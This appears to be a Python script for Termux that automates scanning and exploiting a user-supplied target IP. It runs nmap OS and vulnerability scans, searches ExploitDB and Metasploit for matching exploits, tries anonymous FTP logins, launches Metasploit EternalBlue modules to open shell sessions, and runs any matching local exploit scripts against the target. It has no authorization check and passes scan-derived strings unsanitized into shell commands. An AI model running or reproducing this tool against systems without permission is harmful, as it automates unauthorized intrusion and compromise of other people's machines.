import socket
import nmap
import os
import subprocess
from datetime import datetime
from prettytable import PrettyTable
from pwn import *
import requests
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Configuration
EXPLOIT_DB_PATH = "exploits/"
METASPLOIT_PATH = "/data/data/com.termux/files/usr/bin/msfconsole"

# ----- OS Detection -----
def get_os_info(ip):
    try:
        nm = nmap.PortScanner()
        print(f"\n{Fore.CYAN}🔍 Performing OS detection on {ip}...{Style.RESET_ALL}")
        nm.scan(hosts=ip, arguments='-O')
        for host in nm.all_hosts():
            if 'osmatch' in nm[host]:
                return nm[host]
        return None
    except Exception as e:
        print(f"{Fore.RED}❌ OS detection error: {e}{Style.RESET_ALL}")
        return None

# ----- Categorize Vulnerabilities -----
def categorize_vulnerability(vuln_name):
    vuln_lower = vuln_name.lower()
    categories = {
        'dos': 'Denial-of-Service', 'denial': 'Denial-of-Service',
        'rce': 'Remote Code Execution', 'remote code': 'Remote Code Execution',
        'sqli': 'SQL Injection', 'sql injection': 'SQL Injection',
        'xss': 'Cross-Site Scripting', 'csrf': 'Cross-Site Request Forgery',
        'auth': 'Authentication Bypass', 'authentication': 'Authentication Bypass',
        'buffer': 'Buffer Overflow', 'overflow': 'Buffer Overflow',
        'info': 'Information Disclosure', 'disclosure': 'Information Disclosure',
        'ssl': 'Cryptographic Issues', 'tls': 'Cryptographic Issues',
        'weak': 'Weak Configuration'
    }
    for key, category in categories.items():
        if key in vuln_lower:
            return category
    return 'General Vulnerability'

# ----- Severity Determination -----
def determine_severity(vuln_name, output):
    output_lower = str(output).lower()
    vuln_lower = vuln_name.lower()
    if 'critical' in output_lower or 'exploit' in output_lower:
        return 'High'
    elif 'heartbleed' in vuln_lower or 'shellshock' in vuln_lower or 'eternalblue' in vuln_lower:
        return 'Critical'
    elif 'warning' in output_lower or 'medium' in output_lower:
        return 'Medium'
    elif 'info' in output_lower or 'low' in output_lower:
        return 'Low'
    else:
        return 'Medium'

# ----- Vulnerability Scanner -----
def scan_vulnerabilities(ip):
    try:
        nm = nmap.PortScanner()
        print(f"\n{Fore.CYAN}🔍 Scanning {ip} for vulnerabilities...{Style.RESET_ALL}")
        nm.scan(hosts=ip, arguments='-sV --script vuln')
        vulnerabilities = []
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                for port in ports:
                    if 'script' in nm[host][proto][port]:
                        for script, output in nm[host][proto][port]['script'].items():
                            vuln = {
                                'port': port,
                                'service': nm[host][proto][port]['name'],
                                'name': script,
                                'type': categorize_vulnerability(script),
                                'severity': determine_severity(script, output),
                                'output': output
                            }
                            vulnerabilities.append(vuln)
        return vulnerabilities
    except Exception as e:
        print(f"{Fore.RED}❌ Vulnerability scan error: {e}{Style.RESET_ALL}")
        return []

# ----- Search ExploitDB for Exploits -----
def search_exploitdb(vuln_name):
    try:
        print(f"{Fore.YELLOW}[*] Searching ExploitDB for {vuln_name}...{Style.RESET_ALL}")
        result = subprocess.check_output(f"searchsploit {vuln_name} --exclude=./dos", shell=True).decode()
        if "No results found" not in result:
            exploits = []
            lines = result.split('\n')
            for line in lines:
                if "|" in line and not line.startswith("---"):
                    parts = [p.strip() for p in line.split("|")]
                    if len(parts) >= 3:
                        exploits.append({
                            'id': parts[0],
                            'platform': parts[1],
                            'title': parts[2]
                        })
            return exploits
        return None
    except Exception as e:
        print(f"{Fore.RED}❌ ExploitDB search error: {e}{Style.RESET_ALL}")
        return None

# ----- Search Metasploit for Modules -----
def search_metasploit(vuln_name):
    try:
        print(f"{Fore.YELLOW}[*] Searching Metasploit for {vuln_name}...{Style.RESET_ALL}")
        result = subprocess.check_output(f"msfconsole -q -x 'search {vuln_name}; exit'", shell=True).decode()
        if "No results found" not in result:
            modules = []
            lines = result.split('\n')
            for line in lines:
                if "exploit/" in line or "auxiliary/" in line:
                    parts = [p.strip() for p in line.split() if p.strip()]
                    if len(parts) >= 3:
                        modules.append({
                            'name': parts[0],
                            'disclosure': parts[1],
                            'rank': parts[2],
                            'description': " ".join(parts[3:])
                        })
            return modules
        return None
    except Exception as e:
        print(f"{Fore.RED}❌ Metasploit search error: {e}{Style.RESET_ALL}")
        return None

# ----- Check Local Exploits Directory -----
def check_local_exploits(vuln_name):
    try:
        if not os.path.exists(EXPLOIT_DB_PATH):
            return None
            
        matching_files = []
        for root, dirs, files in os.walk(EXPLOIT_DB_PATH):
            for file in files:
                if vuln_name.lower() in file.lower():
                    matching_files.append(os.path.join(root, file))
        
        return matching_files if matching_files else None
    except Exception as e:
        print(f"{Fore.RED}❌ Local exploit check error: {e}{Style.RESET_ALL}")
        return None

# ----- Run Exploit -----
def run_exploit(ip, port, exploit_info):
    try:
        print(f"{Fore.GREEN}[+] Attempting to run exploit: {exploit_info['title']}{Style.RESET_ALL}")
        
        # Simple example for FTP anonymous login
        if "ftp" in exploit_info['title'].lower() and "anonymous" in exploit_info['title'].lower():
            conn = remote(ip, port, timeout=5)
            conn.send(b"USER anonymous\r\n")
            conn.send(b"PASS anonymous\r\n")
            response = conn.recvline(timeout=3)
            conn.close()
            if "230" in response.decode('utf-8', errors='ignore'):
                return True, f"Anonymous login successful! {response.decode('utf-8', errors='ignore')}"
            else:
                return False, f"Anonymous login failed: {response.decode('utf-8', errors='ignore')}"
        
        # Add more exploit patterns here...
        
        return False, "No direct exploit pattern matched"
    except Exception as e:
        return False, f"Exploit execution failed: {str(e)}"

# ----- Run Metasploit Module -----
def run_metasploit_module(ip, port, module_info):
    try:
        print(f"{Fore.GREEN}[+] Attempting to run Metasploit module: {module_info['name']}{Style.RESET_ALL}")
        
        # Simple example for EternalBlue
        if "eternalblue" in module_info['name'].lower():
            cmd = f"msfconsole -q -x 'use {module_info['name']}; set RHOSTS {ip}; set RPORT {port}; run; exit'"
            result = subprocess.check_output(cmd, shell=True).decode()
            if "Command shell session" in result:
                return True, "Session opened successfully!"
            else:
                return False, "Exploit completed but no session opened"
        
        return False, "No direct Metasploit pattern matched"
    except Exception as e:
        return False, f"Metasploit execution failed: {str(e)}"

# ----- Exploit Detected Vulnerabilities -----
def exploit_vulnerabilities(ip, vulnerabilities):
    print("\n" + Fore.RED + "-"*50)
    print("💥 ATTEMPTING TO EXPLOIT DETECTED VULNERABILITIES")
    print("-"*50 + Style.RESET_ALL)

    for vuln in vulnerabilities:
        if vuln['severity'] not in ['Critical', 'High']:
            continue
            
        port = vuln['port']
        name = vuln['name']
        
        print(f"\n{Fore.BLUE}[*] Processing vulnerability: {name} on port {port}{Style.RESET_ALL}")
        
        # 1. Try to find exploit in ExploitDB
        exploits = search_exploitdb(name)
        if exploits:
            print(f"{Fore.GREEN}[+] Found {len(exploits)} ExploitDB entries!{Style.RESET_ALL}")
            for exploit in exploits[:3]:  # Try first 3
                success, message = run_exploit(ip, port, exploit)
                if success:
                    print(f"{Fore.GREEN}[!] EXPLOIT SUCCESSFUL: {message}{Style.RESET_ALL}")
                    vuln['exploited'] = True
                    vuln['exploit_result'] = message
                    break
                else:
                    print(f"{Fore.YELLOW}[-] Exploit attempt failed: {message}{Style.RESET_ALL}")
        
        # 2. Try Metasploit if previous attempts failed
        if 'exploited' not in vuln:
            modules = search_metasploit(name)
            if modules:
                print(f"{Fore.GREEN}[+] Found {len(modules)} Metasploit modules!{Style.RESET_ALL}")
                for module in modules[:3]:  # Try first 3
                    success, message = run_metasploit_module(ip, port, module)
                    if success:
                        print(f"{Fore.GREEN}[!] METASPLOIT SUCCESSFUL: {message}{Style.RESET_ALL}")
                        vuln['exploited'] = True
                        vuln['exploit_result'] = message
                        break
                    else:
                        print(f"{Fore.YELLOW}[-] Metasploit attempt failed: {message}{Style.RESET_ALL}")
        
        # 3. Check local exploits directory
        if 'exploited' not in vuln:
            local_exploits = check_local_exploits(name)
            if local_exploits:
                print(f"{Fore.GREEN}[+] Found {len(local_exploits)} local exploit scripts!{Style.RESET_ALL}")
                for exploit_path in local_exploits[:3]:  # Try first 3
                    try:
                        print(f"{Fore.YELLOW}[*] Executing local exploit: {exploit_path}{Style.RESET_ALL}")
                        result = subprocess.check_output(f"python {exploit_path} {ip} {port}", shell=True).decode()
                        print(f"{Fore.GREEN}[!] LOCAL EXPLOIT OUTPUT:\n{result}{Style.RESET_ALL}")
                        vuln['exploited'] = True
                        vuln['exploit_result'] = "Local exploit executed - check output"
                        break
                    except Exception as e:
                        print(f"{Fore.RED}[-] Local exploit failed: {str(e)}{Style.RESET_ALL}")
        
        if 'exploited' not in vuln:
            print(f"{Fore.RED}[-] No suitable exploit found for {name}{Style.RESET_ALL}")

# ----- Report Display -----
def print_fancy_report(ip, os_info, vulnerabilities):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print("\n" + Fore.CYAN + "="*60)
    print("|" + " "*58 + "|")
    print(f"|    {Fore.WHITE}NETWORK VULNERABILITY ASSESSMENT & EXPLOITATION TOOL{Fore.CYAN}    |")
    print("|" + " "*58 + "|")
    print("="*60 + Style.RESET_ALL)

    print(f"\n{Fore.BLUE}🔍 Target IP: {ip}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}🕒 Scan Time: {current_time}{Style.RESET_ALL}")
    try:
        print(f"{Fore.BLUE}🌐 Hostname: {socket.getfqdn(ip)}{Style.RESET_ALL}")
    except:
        print(f"{Fore.BLUE}🌐 Hostname: Unknown{Style.RESET_ALL}")

    print("\n" + Fore.CYAN + "-"*50)
    print("💻 OPERATING SYSTEM DETECTION")
    print("-"*50 + Style.RESET_ALL)
    if os_info and 'osmatch' in os_info:
        best_os = max(os_info['osmatch'], key=lambda x: int(x['accuracy']))
        print(f"{Fore.GREEN}✅ Detected OS: {best_os['name']} ({best_os['accuracy']}% confidence){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Possible matches:{Style.RESET_ALL}")
        for osmatch in os_info['osmatch'][:3]:
            print(f"- {osmatch['name']} ({osmatch['accuracy']}%)")
    else:
        print(f"{Fore.RED}❌ OS detection failed{Style.RESET_ALL}")

    if vulnerabilities:
        print("\n" + Fore.CYAN + "-"*50)
        print("🚨 VULNERABILITY FINDINGS")
        print("-"*50 + Style.RESET_ALL)

        table = PrettyTable()
        table.field_names = ["Port", "Service", "Vulnerability", "Category", "Severity", "Exploited"]
        table.align = "l"

        for vuln in vulnerabilities:
            severity = ""
            if vuln['severity'] == "Critical":
                severity = f"{Fore.RED}🔴 Critical{Style.RESET_ALL}"
            elif vuln['severity'] == "High":
                severity = f"{Fore.RED}🔴 High{Style.RESET_ALL}"
            elif vuln['severity'] == "Medium":
                severity = f"{Fore.YELLOW}🟠 Medium{Style.RESET_ALL}"
            else:
                severity = f"{Fore.GREEN}🟢 Low{Style.RESET_ALL}"
            
            exploited = f"{Fore.GREEN}✅ Yes{Style.RESET_ALL}" if vuln.get('exploited') else f"{Fore.RED}❌ No{Style.RESET_ALL}"

            table.add_row([
                vuln['port'],
                vuln['service'],
                vuln['name'],
                vuln['type'],
                severity,
                exploited
            ])

        print(table)

        critical = sum(1 for v in vulnerabilities if v['severity'] == "Critical")
        high = sum(1 for v in vulnerabilities if v['severity'] == "High")
        med = sum(1 for v in vulnerabilities if v['severity'] == "Medium")
        low = sum(1 for v in vulnerabilities if v['severity'] == "Low")
        exploited = sum(1 for v in vulnerabilities if v.get('exploited'))

        print("\n" + Fore.CYAN + "-"*30)
        print("📊 SUMMARY")
        print("-"*30 + Style.RESET_ALL)
        print(f"{Fore.RED}🔴 Critical Vulnerabilities: {critical}{Style.RESET_ALL}")
        print(f"{Fore.RED}🔴 High Vulnerabilities: {high}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🟠 Medium Vulnerabilities: {med}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}🟢 Low Vulnerabilities: {low}{Style.RESET_ALL}")
        print(f"\n{Fore.MAGENTA}💣 Successfully Exploited: {exploited}{Style.RESET_ALL}")

        # Print exploit results
        print("\n" + Fore.CYAN + "-"*50)
        print("💣 EXPLOITATION RESULTS")
        print("-"*50 + Style.RESET_ALL)
        for vuln in vulnerabilities:
            if vuln.get('exploited'):
                print(f"\n{Fore.GREEN}[+] {vuln['name']} on port {vuln['port']}{Style.RESET_ALL}")
                print(f"Result: {vuln.get('exploit_result', 'No details available')}")
                if 'output' in vuln:
                    print(f"\nTechnical details:\n{vuln['output']}")

        print("\n" + Fore.CYAN + "-"*50)
        print("🔧 RECOMMENDED ACTIONS")
        print("-"*50 + Style.RESET_ALL)
        if critical > 0 or high > 0:
            print(f"{Fore.RED}1. IMMEDIATELY patch critical/high vulnerabilities{Style.RESET_ALL}")
        if any(v['type'] == 'Authentication Bypass' for v in vulnerabilities):
            print(f"{Fore.YELLOW}2. Strengthen authentication mechanisms{Style.RESET_ALL}")
        if any(v['type'] == 'Denial-of-Service' for v in vulnerabilities):
            print(f"{Fore.YELLOW}3. Implement DoS protection measures{Style.RESET_ALL}")
        if any(v['type'] == 'SQL Injection' for v in vulnerabilities):
            print(f"{Fore.YELLOW}4. Sanitize database inputs and use prepared statements{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}5. Update all systems to latest versions{Style.RESET_ALL}")
        if exploited > 0:
            print(f"\n{Fore.RED}🚨 URGENT: System was successfully exploited! Immediate remediation required!{Style.RESET_ALL}")

    else:
        print(f"\n{Fore.GREEN}🎉 No vulnerabilities found!{Style.RESET_ALL}")

    print("\n" + Fore.CYAN + "="*60)
    if vulnerabilities:
        print(f"|  {Fore.WHITE}SCAN COMPLETED - {len(vulnerabilities)} VULNERABILITIES FOUND, {exploited if 'exploited' in locals() else 0} EXPLOITED{Fore.CYAN}  |")
    else:
        print(f"|       {Fore.WHITE}SCAN COMPLETED - CLEAN SYSTEM{Fore.CYAN}       |")
    print("="*60 + Style.RESET_ALL)

# ----- Main -----
def main():
    print(Fore.CYAN + "="*60)
    print(f"|{Fore.WHITE}           Professional Vulnerability Scanner & Exploiter           {Fore.CYAN}|")
    print("="*60 + Style.RESET_ALL)
    
    # Create exploits directory if it doesn't exist
    if not os.path.exists(EXPLOIT_DB_PATH):
        os.makedirs(EXPLOIT_DB_PATH)
        print(f"{Fore.YELLOW}[*] Created local exploits directory at {EXPLOIT_DB_PATH}{Style.RESET_ALL}")
    
    target_ip = input(f"{Fore.BLUE}Enter target IP address: {Style.RESET_ALL}")

    os_info = get_os_info(target_ip)
    vulnerabilities = scan_vulnerabilities(target_ip)
    
    if vulnerabilities:
        exploit_vulnerabilities(target_ip, vulnerabilities)
    
    print_fancy_report(target_ip, os_info, vulnerabilities)

if __name__ == "__main__":
    main()
